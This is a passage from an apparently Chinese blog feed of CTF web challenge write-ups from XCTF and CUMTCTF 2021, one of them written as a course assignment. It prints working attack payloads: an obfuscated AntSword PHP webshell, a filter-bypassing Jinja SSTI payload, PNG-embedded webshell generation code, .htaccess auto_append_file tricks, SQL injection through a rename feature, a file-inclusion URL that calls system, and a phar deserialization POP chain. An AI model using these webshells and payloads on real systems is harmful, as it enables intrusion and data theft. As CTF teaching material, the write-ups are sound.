class="variable">$v</span>)!==<span class="variable">$v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$v</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;phar&#x27;</span>);</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">stream_wrapper_register(<span class="string">&#x27;master&#x27;</span>,<span class="string">&#x27;master&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中，<code>parse_str()</code> 函数把查询字符串解析到变量<code>array</code>中，<code>stream_open()</code>函数对<code>path</code>的传参和<code>name</code>的传参从字符串对应到变量，<code>upload()</code>函数过滤了上传文件的内容，包括<code>/file:\|http\|pre\|etc/is</code>以及<code>\&lt;&quot; ’.</code>均被过滤，<code>search()</code>函数判断是否存在和<code>name</code>相同的文件或者目录，并替换为空并列出当前目录。</p><p>在头像上传页面发现疑似文件上传漏洞，但尝试上传后提示等级太低，无法上传。</p><p><img src="/img/602f51299652793045bc0d8c67ac9a5c.png"></p><p>注册十个账户，并填写推荐人后获得积分100，此时可以进行文件上传。</p><p><img src="/img/017ff5dd11dab77b51566d73744f5fa3.png"></p><p>尝试上传图片马，上传成功但无法执行，怀疑触发了关键词过滤，在已上传目录里打开后，如上文代码审计的结论，<code>/file:\|http\|pre\|etc/is</code>以及&lt;“ ’.果然被过滤了，于是想到尝试上传.htaccess文件修改配置文件。构造第一个payload搜索flag文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file master:<span class="comment">//search/path=%2fhome%2f&amp;name=flag</span></span><br></pre></td></tr></table></figure><p>其中<code>%2f</code>是为了绕过’<code>/</code>’的正则匹配法则。</p><p>上传.htaccess文件后已经可以正常上传.php文件：</p><p><img src="/img/40ab785485498af9a2ba7c46ecfdfbaf.png"></p><p> 访问1.php即可得到flag文件名：</p><p><img src="/img/fce008b44f6d51502954d6c593fcae97.png"></p><p>然后再上传一个.htaccess文件，内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file /home/hiahiahia_flag</span><br></pre></td></tr></table></figure><p>此时再访问之前的1.php内容已变为：</p><p><img src="/img/0fa649675dc50497bf7130c94cc97324.png"></p><p>得到flag。</p><h2 id="filemanager-（难度：8-10）"><a href="#filemanager-（难度：8-10）" class="headerlink" title="filemanager （难度：8/10）"></a>filemanager （难度：8/10）</h2><p>首先使用御剑专业版扫描：</p><p><img src="/img/eb880eb3071a4c07664d58962095859c.png"></p><p>打开第一个，发现源代码泄露，进行代码审计：</p><p>发现后端代码使用了白名单，所以无法直接上传木马，同时该版本也不能使用<code>%00</code>截断，但发现网站有rename功能，观察rename.php的代码：</p><p><img src="/img/659d5215596d2b447627c9f3501f17b3.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$result </span>= <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$result </span>= <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = basename(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$re </span>= <span class="variable">$db</span>-&gt;query(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$oldname </span>= UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="variable">$newname </span>= UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">            rename(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url </span>= <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>怀疑可以通过前端功能rename进行sql注入，使其extension值为空：</p><p><img src="/img/59d4725d744f8f2d8367cf42dfe89972.png"></p><p>然后修改文件添加.php后缀，使网站可以执行恶意代码。</p><p>首先上传一个名为<code>&#39;,extension=&#39;.txt</code>的txt文件用来sql注入，然后修改文件名为attack.txt：</p><p><img src="/img/87ca205ac372b908b6414ff07eae00f6.png"></p><p>这样，新的文件名就变成了attack.txt.txt，经过上面高亮的数据库update语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` <span class="keyword">set</span> `filename`<span class="operator">=</span><span class="string">&#x27;attack.txt&#x27;</span>, `oldname`<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,extension<span class="operator">=</span>’’ <span class="keyword">where</span> `fid`<span class="operator">=</span>&#123;$<span class="keyword">result</span>[<span class="string">&#x27;fid&#x27;</span>]&#125;&quot;</span><br></pre></td></tr></table></figure><p>attack.txt的extension就变为空。于是我们再上传一个文件名相同的木马文件，利用Antsword插件生成木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$lVeL</span>=create_function(chr(<span class="number">15876</span>/<span class="number">441</span>).base64_decode(<span class="string">&#x27;cw==&#x27;</span>).chr(<span class="number">894</span>-<span class="number">783</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).str_rot13(<span class="string">&#x27;r&#x27;</span>),chr(<span class="number">01223</span>-<span class="number">01056</span>).chr(<span class="number">0104160</span>/<span class="number">0450</span>).str_rot13(<span class="string">&#x27;n&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).base64_decode(<span class="string">&#x27;KA==&#x27;</span>).str_rot13(<span class="string">&#x27;$&#x27;</span>).chr(<span class="number">0107147</span>/<span class="number">0475</span>).chr(<span class="number">31302</span>/<span class="number">282</span>).chr(<span class="number">0x2ef</span>-<span class="number">0x282</span>).chr(<span class="number">471</span>-<span class="number">370</span>).chr(<span class="number">01237</span>-<span class="number">01166</span>).chr(<span class="number">55932</span>/<span class="number">948</span>));<span class="variable">$lVeL</span>(base64_decode(<span class="string">&#x27;NDU3O&#x27;</span>.<span class="string">&#x27;DI2O0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">528</span>-<span class="number">443</span>).chr(<span class="number">58581</span>/<span class="number">849</span>).base64_decode(<span class="string">&#x27;OQ==&#x27;</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).base64_decode(<span class="string">&#x27;Vg==&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">0533</span>-<span class="number">0425</span>).base64_decode(<span class="string">&#x27;dA==&#x27;</span>).str_rot13(<span class="string">&#x27;w&#x27;</span>).chr(<span class="number">55500</span>/<span class="number">555</span>).str_rot13(<span class="string">&#x27;J&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;10XSk&#x27;</span>.<span class="string">&#x27;7MTM3&#x27;</span>.<span class="string">&#x27;MzQ3O&#x27;</span>.<span class="string">&#x27;Ds=&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传后由于<code>\$result[“extension”]</code>已经通过注入变为空，因此我们可以修改为.php文件。</p><p><img src="/img/fc4be299b9b03fd1881a80e2d8290bed.png"></p><p><img src="/img/81828d2b0adce03312bad2d98886eb75.png"></p><p>使用Antsword连接可以拿到flag。</p><p><img src="/img/e1453df898e4722d88020a7bd249c304.png"></p><p>也可以在虚拟终端内得到flag：</p><p><img src="/img/8e36f0ea7b1de9c3bf56f9f5eae721ba.png"></p><h2 id="ics-04-（难度4-10）"><a href="#ics-04-（难度4-10）" class="headerlink" title="ics-04 （难度4/10）"></a>ics-04 （难度4/10）</h2><p>进入登录页面后发现三个入口可能存在sql注入漏洞：登录、注册和忘记密码：</p><p><img src="/img/fff877e45ab9d177e18a60d14527e149.png"></p><p>于是首先用sqlmap扫描登录页面，发现不存在sql注入：</p><p><img src="/img/f18b5dfa2d26c186405ec978905431d6.png"></p><p>同样，注册页面也不存在sql注入，但在忘记密码页面，成功扫描出4个数据库：</p><p><img src="/img/d715210161ac3cbb312864bea312da63.png"></p><p>因为该网站名为cetc，所以首先尝试访问该数据库。访问后发现只有一个user表，于是直接dump。之后发现密码已经加密，sqlmap的hash破解没有作用（后两个用户是我自己注册的），但我们得到了管理员用户名<code>c3tlwDmIn23</code>：</p><p><img src="/img/4f810777cb8e49cb6e63978ce139b27f.png"></p><p>后来尝试后发现该网站用户访问控制系统存在逻辑漏洞，可以重复注册同一个用户名，于是我们直接注册<code>c3tlwDmIn23</code>，便可以得到管理员权限。</p><p>注册后成功登录，便得到flag：<code>cyberpeace&#123;7de7a525272f7a3463d04739e971fc9b&#125;</code>。</p><p><img src="/img/f931eb8fccbd887628c1de4b24e06195.png"></p><h2 id="bug-（难度：5-10）"><a href="#bug-（难度：5-10）" class="headerlink" title="bug （难度：5/10）"></a>bug （难度：5/10）</h2><p>首先尝试注册admin账户，发现账号已存在。于是先注册一个test账号：</p><p><img src="/img/0a87565bab6dad4d36f218c2782a9545.png"></p><p>但普通账号进入后无法打开manage选项卡，于是尝试寻找修改密码模块的逻辑漏洞。尝试Findpwd，然后用Burp Suite抓包，发现有username的信息，修改为admin：</p><p><img src="/img/9d2f94bcd4f25358152322c0e256cd55.png"></p><p><img src="/img/b6a30b8f82edc53f2579e6ddda92c795.png">提示修改成功：</p><p><img src="/img/8e6d64ae0dea0aa890fbd6d0a2be3072.png"></p><p>成功进入admin账户，但在进入manage界面时提示IP不允许，只需要抓包然后加上<code>X-Forwarded-For: 127.0.0.1</code>即可。</p><p><img src="/img/d7d300fa8f0c50d4bb20c3859e47d4a6.png"></p><p>进入之后打卡检查元素，发现页面注释有提示：</p><p><img src="/img/9e575230738b3c495d081f99b5a404a3.png"></p><p>如果直接访问这个网址会提示Action is not correct！只需要把???改成upload即可。</p><p><img src="/img/1366fb99b6041c8d547fa144d924fd87.png"></p><p>如果直接上传php文件的话会报错，如果直接修改MIME也不行，因为会检查文件内的<code>&lt;php&gt;</code>标签。这里需要用script模式绕过，上传一个内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;helloworld_php_script&lt;/script&gt;  </span><br></pre></td></tr></table></figure><p>的jpg文件，然后用Burp Suite 抓包：</p><p><img src="/img/ed37f367c815522cc62e05edf4b2deef.png">Send后得到flag：<code>cyberpeace&#123;e788ce13e8255b0068e72bcf476453ec&#125;</code>。</p><p><img src="/img/78da8241a87b9d1ce7fa2cee3fa713ec.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note info flat&quot;&gt;&lt;p&gt;本文是《网络安全课程设计》的一项任务&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;robots&quot;&gt;&lt;a href=&quot;#robots&quot; class=&quot;headerlink&quot; title=&quot;robots&quot;&gt;&lt;/a&gt;robots</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://zxy.link/tags/CTF/"/>
    
    <category term="Web" scheme="https://zxy.link/tags/Web/"/>
    
    <category term="课程作业" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    <category term="网络安全" scheme="https://zxy.link/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="攻防世界" scheme="https://zxy.link/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF-2021秋季赛部分题解</title>
    <link href="https://zxy.link/posts/dae2f53a/"/>
    <id>https://zxy.link/posts/dae2f53a/</id>
    <published>2021-10-06T16:00:00.000Z</published>
    <updated>2022-01-22T12:43:07.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>经过多次尝试发现request被禁用，于是构造payload直接给不同变量赋值，拼接成最后的<code>file=&#39;/flag&#39;</code>命令。这里直接放payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|<span class="keyword">string</span>|<span class="keyword">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">102</span>)%<span class="number">2</span>bchr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">103</span>)%&#125;</span><br><span class="line">&#123;%<span class="keyword">print</span>(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>在<a href="http://219.219.61.234:7777/robots.txt%E5%8F%91%E7%8E%B0hint%EF%BC%9A">http://219.219.61.234:7777/robots.txt发现hint：</a></p><p><img src="/img/image-20211007172344153.png" alt="image-20211007172344153"></p><p>进入后发现上传页面。多次尝试在图片中包含小马但被系统提示：真的是图片吗? 于是再次尝试修改文件头等方式均无效，最后怀疑是调用了<code>imagecreatefrom</code>函数进行了二次渲染。于是使用如下php代码制作一张二次渲染后恶意代码仍存在的png文件。这段代码能将小马隐藏在一张正常图片之中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用命令行执行php代码，得到<code>1.png</code>，上传后成功被系统accept。</p><p>接下来利用文件包含漏洞调用上传的小马：payload：<a href="http://219.219.61.234:7777/?0=system&amp;file=./upload/413110900.png%EF%BC%8C%E7%84%B6%E5%90%8Epost">http://219.219.61.234:7777/?0=system&amp;file=./upload/413110900.png，然后post</a> <code>1=cat /flag</code></p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211002223439.png" alt="QQ截图20211002223439"></p><p>得到flag。<img src="/img/QQ%E6%88%AA%E5%9B%BE20211002223421.png" alt="QQ截图20211002223421"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>首先在show file页面输入<code>index.php</code>得到部分源代码：</p><p><img src="/img/image-20211007181142317.png" alt="image-20211007181142317"></p><p>由<code>include &#39;base.php&#39;;</code>，于是进入<a href="http://219.219.61.234:20022/file.php?file=base.php%EF%BC%8C%E4%BB%A5%E6%AD%A4%E6%96%B9%E6%B3%95%E5%8F%88%E5%BE%97%E5%88%B0%E4%BA%86%60class.php%60%E3%80%81%60file.php%60%E3%80%81%60upload.php%60%E3%80%81%60function.php%60%E7%9A%84%E6%BA%90%E7%A0%81%E3%80%82%E4%BB%8E%60function.php%60%E7%9A%84%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%82%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%9A">http://219.219.61.234:20022/file.php?file=base.php，以此方法又得到了`class.php`、`file.php`、`upload.php`、`function.php`的源码。从`function.php`的以下代码中可以发现服务器存储文件名的算法：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        unlink(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>即将整个文件名用md5加密，然后加上后缀.jpg，存放到<code>upload/</code>中。</p><p>下面我们根据<code>class.php</code>构造POP链生成phar文件，主要原理：利用File类<code>__destruct()</code>中的<code>echo $this-&gt;file;</code>语句—&gt;调用Docker类的 <code>__toString()</code>函数—&gt;调用Cloud类中的<code>get_file()</code>函数得到<code>/flag</code>。利用以下代码生成phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span> = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$do</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$fi</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$cl</span> =<span class="keyword">new</span> Cloud();</span><br><span class="line"><span class="variable">$do</span>-&gt;str = <span class="variable">$cl</span>;</span><br><span class="line"><span class="variable">$fi</span>-&gt;fakefile = <span class="variable">$do</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;exp9.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$fi</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功上传后利用文件包含漏洞访问phar文件，得到flag。payload：<a href="http://219.219.61.234:20022/file.php?file=phar://upload/173d9a103870c14d86fdb93129ee7d9c.jpg">http://219.219.61.234:20022/file.php?file=phar://upload/173d9a103870c14d86fdb93129ee7d9c.jpg</a></p><p><img src="/img/image-20211007180941116.png" alt="image-20211007180941116"></p><p>base64解码得到flag。</p><h2 id="web7"><a href="#web7" class="headerlink" 